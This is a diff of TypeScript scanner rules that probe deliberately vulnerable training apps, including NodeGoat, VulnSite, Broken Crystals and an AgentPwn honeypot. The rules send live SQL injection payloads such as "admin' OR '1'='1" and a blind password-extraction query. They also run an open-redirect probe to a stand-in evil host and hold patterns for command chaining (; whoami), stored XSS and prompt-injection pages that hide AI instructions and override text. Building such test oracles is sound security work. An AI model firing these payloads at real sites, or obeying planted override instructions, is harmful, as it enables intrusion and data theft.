+const agentpwnMcpExploitationRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAgentpwnHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/attacks\/mcp-exploitation\/\d+/i.test(pageUrl)) return NEGATIVE;
+  let corpus = `${ctx.combined}\n${agentpwnResponseHeaderCorpus(ctx.home.headers)}`;
+  let markers = agentpwnMcpExploitationMarkers(corpus);
+  if (!markers.attackId && !markers.vector) {
+    const pageDoc = await ctx.probe.get(pageUrl, { maxBytes: 65536, timeoutMs: 18000 });
+    if (pageDoc.status >= 200 && pageDoc.status < 400) {
+      corpus = `${corpus}\n${pageDoc.body}\n${agentpwnResponseHeaderCorpus(pageDoc.headers)}`;
+      markers = agentpwnMcpExploitationMarkers(corpus);
+    }
+  }
+  if (!markers.attackId && !markers.vector) return NEGATIVE;
+  const tierMatch = pageUrl.match(/\/mcp-exploitation\/(\d+)/i);
+  return {
+    fired: true,
+    confidence: markers.attackId && markers.vector ? 0.94 : 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      attackId: markers.attackId,
+      tier: tierMatch?.[1] ?? null,
+      mcpCheck: markers.mcpCheck,
+      vector: markers.vector,
+      aiInstructionsSample: corpus.match(/<meta\s+name=["']ai-instructions["']\s+content=["']([^"']{20,})["']/i)?.[1]?.slice(0, 120),
+      note: "AgentPwn /attacks/mcp-exploitation route scan — MCP tool discovery/injection/cross-tool-chain smuggling via ai-instructions and hidden SYSTEM INSTRUCTIONS (APWN-MCP honeypot oracle)"
+    }
+  };
+};
+
+function agentpwnContextWindowMarkers(corpus: string): {
+  attackId?: string;
+  contextWindow?: boolean;
+  aiInstructions?: string;
+} {
+  const attackId = corpus.match(/APWN-CW-\d{3}/i)?.[0];
+  const contextWindow =
+    /context[- ]window|Attention Dilution|instruction displacement/i.test(corpus) ||
+    /category=context-window/i.test(corpus);
+  const aiInstructions = corpus.match(
+    /<meta\s+name=["']ai-instructions["']\s+content=["']([^"']{20,})["']/i
+  )?.[1];
+  return { attackId, contextWindow, aiInstructions };
+}
+
+const agentpwnContextWindowRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAgentpwnHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/attacks\/context-window\/\d+/i.test(pageUrl)) return NEGATIVE;
+  let corpus = `${ctx.combined}\n${agentpwnResponseHeaderCorpus(ctx.home.headers)}`;
+  let markers = agentpwnContextWindowMarkers(corpus);
+  if (!markers.attackId || !markers.aiInstructions) {
+    const pageDoc = await ctx.probe.get(pageUrl, { maxBytes: 65536, timeoutMs: 18000 });
+    if (pageDoc.status >= 200 && pageDoc.status < 400) {
+      corpus = `${corpus}\n${pageDoc.body}\n${agentpwnResponseHeaderCorpus(pageDoc.headers)}`;
+      markers = agentpwnContextWindowMarkers(corpus);
+    }
+  }
+  if (!markers.attackId || !markers.aiInstructions) return NEGATIVE;
+  const tierMatch = pageUrl.match(/\/context-window\/(\d+)/i);
+  return {
+    fired: true,
+    confidence: markers.contextWindow ? 0.94 : 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      attackId: markers.attackId,
+      tier: tierMatch?.[1] ?? null,
+      aiInstructionsSample: markers.aiInstructions.slice(0, 120),
+      note: "AgentPwn /attacks/context-window route scan — ai-instructions meta buries malicious Section 14 Administrative Override inside benign ML content (APWN-CW attention-dilution honeypot oracle)"
+    }
+  };
+};
+
+const nodegoatTutorialA10RouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tutorial\/a10\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatTutorialMarkers(ctx, "a10", [
+    {
+      label: "A10 unvalidated redirects tutorial title",
+      re: /A10-Unvalidated Redirects and Forwards|A10[\s-]+Redirects/i
+    },
+    {
+      label: "/learn?url= open redirect walkthrough",
+      re: /\/learn\?url=|res\.redirect\(req\.query\.url\)/i
+    },
+    {
+      label: "Redirect validation mitigation topics",
+      re: /redirect victims to phishing|Without proper validation, attackers can redirect|Simply avoid using redirects and forwards/i
+    }
+  ], "NodeGoat /tutorial/a10 documents unvalidated redirects and forwards (/learn?url=) training content");
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const nodegoatLearnOpenRedirectLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  let cookie = await nodegoatNosqlLoginCookie(ctx);
+  if (!cookie) cookie = await nodegoatRegisterSessionCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  const probeHost = "evil-open-redirect-probe.example";
+  const learnUrl = new URL("/learn", ctx.origin);
+  learnUrl.searchParams.set("url", `https://${probeHost}/`);
+  const doc = await ctx.probe.get(learnUrl.toString(), {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual",
+    headers: { Cookie: cookie }
+  });
+  const location = doc.headers["location"] || "";
+  if (![301, 302, 303, 307, 308].includes(doc.status)) return NEGATIVE;
+  if (!location.includes(probeHost)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      learnUrl: learnUrl.toString(),
+      location,
+      snippet: location.slice(0, 160),
+      note: "NodeGoat GET /learn?url= reflects attacker-controlled URL in 302 Location without validation — unvalidated open redirect oracle"
+    }
+  };
+};
+
+const nodegoatLearnOpenRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/learn(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const live = await nodegoatLearnOpenRedirectLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "NodeGoat /learn route scan — GET /learn?url= reflects attacker URL in 302 Location without validation"
+      }
+    };
+  }
+  const tutorialUrl = new URL("/tutorial/a10", ctx.origin).toString();
+  const doc = await ctx.probe.get(tutorialUrl, { maxBytes: 65536, timeoutMs: 15000 });
+  const markers: { label: string; sample: string }[] = [];
+  for (const { label, re } of [
+    {
+      label: "A10 unvalidated redirects tutorial title",
+      re: /A10-Unvalidated Redirects and Forwards|A10[\s-]+Redirects/i
+    },
+    {
+      label: "/learn?url= open redirect walkthrough",
+      re: /\/learn\?url=|res\.redirect\(req\.query\.url\)/i
+    },
+    {
+      label: "Redirect validation mitigation topics",
+      re: /redirect victims to phishing|Without proper validation, attackers can redirect|Simply avoid using redirects and forwards/i
+    }
+  ]) {
+    const m = doc.body.match(re);
+    if (m) markers.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (markers.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      tutorialUrl,
+      markers: markers.slice(0, 3),
+      note: "NodeGoat /learn route scan — /tutorial/a10 documents unvalidated /learn?url= open redirect (session-gated on public Heroku; marker oracle via A10 tutorial)"
+    }
+  };
+};
+
+const nodegoatSignupOpenRegistrationLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const signupUrl = new URL("/signup", ctx.origin).toString();
+  const signupPage = await ctx.probe.get(signupUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (signupPage.status < 200 || signupPage.status >= 400) return NEGATIVE;
+  if (!/userName/i.test(signupPage.body) || !/Enter sign up information/i.test(signupPage.body))
+    return NEGATIVE;
+  const userName = `thugir_ng_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const csrfMatch = signupPage.body.match(/name="_csrf"\s+value="([^"]*)"/i);
+  const csrf = csrfMatch?.[1] ?? "";
+  const regDoc = await ctx.probe.get(signupUrl, {
+    method: "POST",
+    body: `userName=${encodeURIComponent(userName)}&firstName=Thugir&lastName=Probe&password=ThugirTest123!&verify=ThugirTest123!&email=${encodeURIComponent(`${userName}@probe.local`)}&_csrf=${encodeURIComponent(csrf)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const regOk =
+    [301, 302, 303, 307, 308].includes(regDoc.status) ||
+    /E11000 duplicate key/i.test(regDoc.body) ||
+    /WriteError/i.test(regDoc.body) ||
+    (regDoc.status === 200 &&
+      nodegoatSessionCookieFromDoc(regDoc) !== null &&
+      /\/login/i.test(regDoc.body));
+  if (!regOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /E11000 duplicate key/i.test(regDoc.body) ? 0.91 : 0.93,
+    evidence: {
+      signupUrl,
+      userName,
+      status: regDoc.status,
+      snippet: regDoc.body.slice(0, 200).trim(),
+      note: "NodeGoat POST /signup processes unauthenticated registration (MongoDB WriteError E11000 duplicate _id or redirect) — open registration oracle"
+    }
+  };
+};
+
+const nodegoatSignupRouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:register|signup)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatSignupOpenRegistrationLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "NodeGoat /register or /signup route scan — unauthenticated POST /signup creates accounts without admin approval — open registration oracle"
     }
   };
 };
@@ -16427,6 +17356,374 @@ const vulnExposeSqliSearchApiLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const vulnExposeAuthBypassRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vuln-expose\.vercel\.app|vulns-expose\.jveltri\.com\.ar/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/login/i.test(pageUrl)) return NEGATIVE;
+  const result = await vulnExposeAuthBypassApiLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnSite /api/auth/login route scan — POST accepts SQLi username admin' OR '1'='1 and returns authenticated admin session"
+    }
+  };
+};
+
+const vulnExposeSqliSearchRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vuln-expose\.vercel\.app|vulns-expose\.jveltri\.com\.ar/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/search/i.test(pageUrl)) return NEGATIVE;
+  const result = await vulnExposeSqliSearchApiLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnSite /api/search route scan — GET echoes raw SQL query and documents UNION/boolean injection vectors"
+    }
+  };
+};
+
+function isVulnExposeHost(ctx: RuleContext): boolean {
+  return /vuln-expose\.vercel\.app|vulns-expose\.jveltri\.com\.ar/i.test(ctx.origin);
+}
+
+async function vulnExposeModulePageMarkers(
+  ctx: RuleContext,
+  canonicalPath: string,
+  spec: (typeof VULN_EXPOSE_MODULE_SPECS)[number]
+): Promise<RuleResult> {
+  const canonicalUrl = new URL(canonicalPath, ctx.origin).toString();
+  const doc = await ctx.probe.get(canonicalUrl, { maxBytes: 65536, timeoutMs: 60000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of spec.markers) {
+    const m = doc.body.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hits.length >= 3 ? 0.92 : 0.9,
+    evidence: {
+      canonicalUrl,
+      markers: hits.slice(0, 4),
+      snippet: hits[0]?.sample,
+      note: spec.note
+    }
+  };
+}
+
+async function vulnExposeJsChunkCorpus(
+  ctx: RuleContext,
+  pageHtml: string,
+  chunkMatch: RegExp
+): Promise<string> {
+  const chunkRe = /\/_next\/static\/chunks\/[a-f0-9]+\.js/gi;
+  const chunks = [...new Set(pageHtml.match(chunkRe) ?? [])].slice(0, 12);
+  for (const chunkPath of chunks) {
+    const chunkUrl = new URL(chunkPath, ctx.origin).toString();
+    const chunkDoc = await ctx.probe.get(chunkUrl, { maxBytes: 65536, timeoutMs: 60000 });
+    if (chunkMatch.test(chunkDoc.body)) return chunkDoc.body;
+  }
+  return "";
+}
+
+const vulnExposeCmdiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/cmdi(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const spec = VULN_EXPOSE_MODULE_SPECS.find((s) => s.pathRe.test("/cmdi"));
+  if (!spec) return NEGATIVE;
+  const pageDoc = await ctx.probe.get(new URL("/cmdi", ctx.origin).toString(), {
+    maxBytes: 65536,
+    timeoutMs: 60000
+  });
+  if (pageDoc.status < 200 || pageDoc.status >= 400) return NEGATIVE;
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of spec.markers) {
+    const m = pageDoc.body.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 2) return NEGATIVE;
+  const jsCorpus = await vulnExposeJsChunkCorpus(
+    ctx,
+    pageDoc.body,
+    /127\.0\.0\.1; whoami|Command Injection - Laboratorio|uid=33\(www-data\)/i
+  );
+  const cmdiLive = /127\.0\.0\.1; whoami|uid=33\(www-data\)/i.test(jsCorpus);
+  return {
+    fired: true,
+    confidence: cmdiLive ? 0.94 : hits.length >= 3 ? 0.92 : 0.9,
+    evidence: {
+      canonicalUrl: new URL("/cmdi", ctx.origin).toString(),
+      markers: hits.slice(0, 4),
+      scannedUrl: pageUrl,
+      ...(cmdiLive
+        ? {
+            jsSnippet: jsCorpus.match(/127\.0\.0\.1; whoami[\s\S]{0,120}/i)?.[0]?.slice(0, 120)
+          }
+        : {}),
+      note: cmdiLive
+        ? "VulnSite /cmdi route scan — ping-tool bundle documents 127.0.0.1; whoami command chaining with www-data uid output simulation"
+        : "VulnSite /cmdi route scan — command injection lab with ping-tool injection point and reverse-shell payload grid (aliases /cmdi/execute → /cmdi)"
+    }
+  };
+};
+
+const vulnExposeIdorProfileRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/idor(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const spec = VULN_EXPOSE_MODULE_SPECS.find((s) => s.pathRe.test("/idor/dashboard"));
+  if (!spec) return NEGATIVE;
+  const result = await vulnExposeModulePageMarkers(ctx, "/idor/dashboard", spec);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnSite /idor/profile route scan — IDOR privilege-escalation lab with user-profile and document-access panels (aliases /idor/profile → /idor/dashboard)"
+    }
+  };
+};
+
+const vulnExposeBlindSqliApiLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const usersUrl = new URL("/api/users", ctx.origin);
+  usersUrl.searchParams.set(
+    "id",
+    "1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'"
+  );
+  const doc = await ctx.probe.get(usersUrl.toString(), { maxBytes: 4096, timeoutMs: 60000 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!/"query"\s*:\s*"SELECT/i.test(doc.body)) return NEGATIVE;
+  if (!/SUBSTRING\s*\(\s*password/i.test(doc.body)) return NEGATIVE;
+  if (!/boolean_based|blind|id_injection/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: usersUrl.toString(),
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "VulnSite GET /api/users?id= accepts boolean-blind SUBSTRING(password,…) payloads and echoes the raw SQL query — blind SQL injection API oracle"
+    }
+  };
+};
+
+const vulnExposeSqliBlindRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/sqli\/blind(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const spec = VULN_EXPOSE_MODULE_SPECS.find((s) => s.pathRe.test("/sqli/blind"));
+  if (!spec) return NEGATIVE;
+  const pageResult = await vulnExposeModulePageMarkers(ctx, "/sqli/blind", spec);
+  if (!pageResult.fired) return NEGATIVE;
+  const apiResult = await vulnExposeBlindSqliApiLiveOracle(ctx);
+  return {
+    fired: true,
+    confidence: apiResult.fired ? 0.94 : pageResult.confidence,
+    evidence: {
+      ...pageResult.evidence,
+      ...(apiResult.fired ? { api: apiResult.evidence } : {}),
+      scannedUrl: pageUrl,
+      note: "VulnSite /sqli/blind route scan — advanced blind SQLi lab with boolean/time-based extraction panels and /api/users SUBSTRING injection oracle"
+    }
+  };
+};
+
+const vulnExposeXssCspBypassRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/xss\/csp-bypass(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const spec = VULN_EXPOSE_MODULE_SPECS.find((s) => s.pathRe.test("/xss/csp-bypass"));
+  if (!spec) return NEGATIVE;
+  const result = await vulnExposeModulePageMarkers(ctx, "/xss/csp-bypass", spec);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnSite /xss/csp-bypass route scan — CSP bypass lab with policy simulator and JSONP/Angular/DOM/WebSocket bypass methods"
+    }
+  };
+};
+
+const vulnExposeCommentsStoredXssApiLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const commentsUrl = new URL("/api/comments", ctx.origin);
+  commentsUrl.searchParams.set("postId", "1");
+  const doc = await ctx.probe.get(commentsUrl.toString(), { maxBytes: 8192, timeoutMs: 60000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"comments"\s*:\s*\[/i.test(doc.body)) return NEGATIVE;
+  if (!/"query"\s*:\s*"SELECT/i.test(doc.body)) return NEGATIVE;
+  const scriptMatch = doc.body.match(/<script>[\s\S]*?<\/script>/i);
+  if (!scriptMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: commentsUrl.toString(),
+      snippet: doc.body.slice(0, 280).trim(),
+      storedPayload: scriptMatch[0].slice(0, 80),
+      note: "VulnSite GET /api/comments?postId= returns persisted comment bodies with raw <script> tags unescaped in JSON — stored XSS API oracle"
+    }
+  };
+};
+
+const vulnExposeXssCommentsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/xss\/comments(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const spec = VULN_EXPOSE_MODULE_SPECS.find((s) => s.pathRe.test("/xss/comments"));
+  if (!spec) return NEGATIVE;
+  const pageResult = await vulnExposeModulePageMarkers(ctx, "/xss/comments", spec);
+  if (!pageResult.fired) return NEGATIVE;
+  const apiResult = await vulnExposeCommentsStoredXssApiLiveOracle(ctx);
+  return {
+    fired: true,
+    confidence: apiResult.fired ? 0.95 : pageResult.confidence,
+    evidence: {
+      ...pageResult.evidence,
+      ...(apiResult.fired ? { api: apiResult.evidence } : {}),
+      scannedUrl: pageUrl,
+      note: "VulnSite /xss/comments route scan — stored XSS comments lab with dangerouslySetInnerHTML sink and /api/comments returning raw script payloads"
+    }
+  };
+};
+
+const vulnExposeNetworkToolsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/network-tools(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const spec = VULN_EXPOSE_MODULE_SPECS.find((s) => s.pathRe.test("/network-tools"));
+  if (!spec) return NEGATIVE;
+  const pageDoc = await ctx.probe.get(new URL("/network-tools", ctx.origin).toString(), {
+    maxBytes: 65536,
+    timeoutMs: 60000
+  });
+  if (pageDoc.status < 200 || pageDoc.status >= 400) return NEGATIVE;
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of spec.markers) {
+    const m = pageDoc.body.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 2) return NEGATIVE;
+  const jsCorpus = await vulnExposeJsChunkCorpus(
+    ctx,
+    pageDoc.body,
+    /hidden_cmdi_ping|Network Tools CMD|127\.0\.0\.1; whoami/i
+  );
+  const cmdiSim = /hidden_cmdi_ping|127\.0\.0\.1; whoami/i.test(jsCorpus);
+  return {
+    fired: true,
+    confidence: cmdiSim ? 0.94 : hits.length >= 3 ? 0.92 : 0.9,
+    evidence: {
+      canonicalUrl: new URL("/network-tools", ctx.origin).toString(),
+      markers: hits.slice(0, 4),
+      scannedUrl: pageUrl,
+      ...(cmdiSim
+        ? {
+            jsSnippet: jsCorpus.match(/hidden_cmdi_ping|127\.0\.0\.1; whoami[\s\S]{0,80}/i)?.[0]?.slice(0, 100)
+          }
+        : {}),
+      note: cmdiSim
+        ? "VulnSite /network-tools route scan — ping tool bundle simulates hidden_cmdi_ping command injection via hostname chaining (; whoami)"
+        : "VulnSite /network-tools route scan — server-side ping connectivity lab with ICMP Echo Request tooling (SSRF-prone)"
+    }
+  };
+};
+
+const vulnExposeBlogStoredXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/blog(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const spec = VULN_EXPOSE_MODULE_SPECS.find((s) => s.pathRe.test("/blog"));
+  if (!spec) return NEGATIVE;
+  const result = await vulnExposeModulePageMarkers(ctx, "/blog", spec);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnSite /blog route scan — TechCorp corporate blog with stored XSS comment sink via dangerouslySetInnerHTML (hidden_xss_comments lab)"
+    }
+  };
+};
+
+const vulnExposeInvoicesSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/invoices(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const spec = VULN_EXPOSE_MODULE_SPECS.find((s) => s.pathRe.test("/invoices"));
+  if (!spec) return NEGATIVE;
+  const pageResult = await vulnExposeModulePageMarkers(ctx, "/invoices", spec);
+  if (!pageResult.fired) return NEGATIVE;
+  const pageDoc = await ctx.probe.get(new URL("/invoices", ctx.origin).toString(), {
+    maxBytes: 65536,
+    timeoutMs: 60000
+  });
+  const chunkRe = /\/_next\/static\/chunks\/[a-f0-9]+\.js/gi;
+  let jsCorpus = "";
+  const chunks = [...new Set(pageDoc.body.match(chunkRe) ?? [])].slice(0, 8);
+  for (const chunkPath of chunks) {
+    const chunkUrl = new URL(chunkPath, ctx.origin).toString();
+    const chunkDoc = await ctx.probe.get(chunkUrl, { maxBytes: 65536, timeoutMs: 60000 });
+    if (/SELECT \* FROM invoices WHERE client_name LIKE/i.test(chunkDoc.body)) {
+      jsCorpus = chunkDoc.body;
+      break;
+    }
+  }
+  const sqlConcat =
+    /SELECT \* FROM invoices WHERE client_name LIKE/i.test(jsCorpus) ||
+    /hidden_sqli_search/i.test(jsCorpus);
+  return {
+    fired: true,
+    confidence: sqlConcat ? 0.94 : pageResult.confidence,
+    evidence: {
+      ...pageResult.evidence,
+      scannedUrl: pageUrl,
+      ...(sqlConcat
+        ? {
+            jsSnippet: jsCorpus
+              .match(/SELECT \* FROM invoices WHERE[\s\S]{0,120}/i)?.[0]
+              ?.slice(0, 120)
+          }
+        : {}),
+      note: "VulnSite /invoices route scan — corporate invoice search builds client-side SQL via string concatenation (hidden_sqli_search lab)"
+    }
+  };
+};
+
+const brokencrystalsUsersSearchRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/users\/search/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsUsersSearchExposureLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/users/search/ route scan — GET returns cardNumber and phoneNumber for multiple users without authentication"
+    }
+  };
+};
+
 const vulnbankAiAnonymousChatLiveOracle: Rule = async (ctx) => {
   if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
   const chatUrl = new URL("/api/ai/chat/anonymous", ctx.origin).toString();
@@ -17376,6 +18673,23 @@ const brokencrystalsMarketplacePrototypePollutionLiveOracle: Rule = async (ctx) 
   };
 };
 
+const brokencrystalsMarketplaceRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/marketplace/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsMarketplacePrototypePollutionLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /marketplace route scan — JS bundle ships prototypePollutionDomXss script gadget and __proto__ marketplace parsing — prototype pollution DOM XSS oracle"
+    }
+  };
+};
+
 const clientSideVulnExposeEvidence: Rule = async (ctx) => {
   const pageUrl = ctx.home.finalUrl || ctx.origin;
   const corpus = `${ctx.combined}\n${pageUrl}`;
@@ -17443,7 +18757,25 @@ const VULN_EXPOSE_MODULE_SPECS: {
     note: "VulnSite /sqli/blind module documents boolean/time-based blind SQL injection extraction lab"
   },
   {
-    pathRe: /\/xss\//i,
+    pathRe: /\/xss\/csp-bypass(?:\/|$|\?)/i,
+    markers: [
+      {
+        label: "CSP bypass advanced lab banner",
+        re: /XSS CSP Bypass - Laboratorio Avanzado|LABORATORIO DE CSP BYPASS AVANZADO/i
+      },
+      {
+        label: "CSP policy simulator panel",
+        re: /CSP Policy Simulator|Content Security Policy Activa/i
+      },
+      {
+        label: "CSP bypass testing methods",
+        re: /CSP Bypass Testing|Método de Bypass|JSONP|unsafe-eval|unsafe-inline/i
+      }
+    ],
+    note: "VulnSite /xss/csp-bypass module documents Content Security Policy bypass techniques (JSONP, Angular, DOM, WebSocket)"
+  },
+  {
+    pathRe: /\/xss\/(?!csp-bypass)/i,
     markers: [
       {
         label: "XSS exploitation lab banner",
@@ -17517,6 +18849,46 @@ const VULN_EXPOSE_MODULE_SPECS: {
       }
     ],
     note: "VulnSite /network-tools module documents server-side ping/fetch connectivity lab (SSRF-prone)"
+  },
+  {
+    pathRe: /\/blog(?:\/|$|\?)/i,
+    markers: [
+      {
+        label: "TechCorp corporate blog header",
+        re: /TechCorp Blog/i
+      },
+      {
+        label: "Featured article section",
+        re: /Artículo Destacado|Artículos Recientes/i
+      },
+      {
+        label: "Stored XSS dangerouslySetInnerHTML sink",
+        re: /dangerouslySetInnerHTML/i
+      },
+      {
+        label: "Corporate blog tagline",
+        re: /Noticias, actualizaciones y recursos tecnológicos/i
+      }
+    ],
+    note: "VulnSite /blog corporate app documents stored XSS via comment dangerouslySetInnerHTML (hidden_xss_comments lab)"
+  },
+  {
+    pathRe: /\/invoices(?:\/|$|\?)/i,
+    markers: [
+      {
+        label: "Corporate invoice system header",
+        re: /Sistema de Facturas/i
+      },
+      {
+        label: "Invoice search panel",
+        re: /Buscar facturas|Buscar por cliente, número de factura o email/i
+      },
+      {
+        label: "Invoice dashboard metrics",
+        re: /Total Facturas|Total Monto|Gestión y seguimiento de facturas/i
+      }
+    ],
+    note: "VulnSite /invoices corporate app documents client-side SQL concatenation in invoice search (hidden_sqli_search lab)"
   }
 ];
 
@@ -21747,6 +23119,113 @@ const clientSideAuthSecurityProjectEvidence: Rule = async (ctx) => {
   };
 };
 
+function isAuthSecurityProjectHost(ctx: RuleContext): boolean {
+  return /auth-security-project\.onrender\.com/i.test(ctx.origin);
+}
+
+function authSecurityProjectSessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
+  return doc.setCookies.find((c) => /^session=/i.test(c))?.split(";")[0] ?? null;
+}
+
+const AUTH_SECURITY_SQLI_PAYLOAD = "admin' OR '1'='1";
+const AUTH_SECURITY_XSS_CANARY = "thugirXSScanary";
+
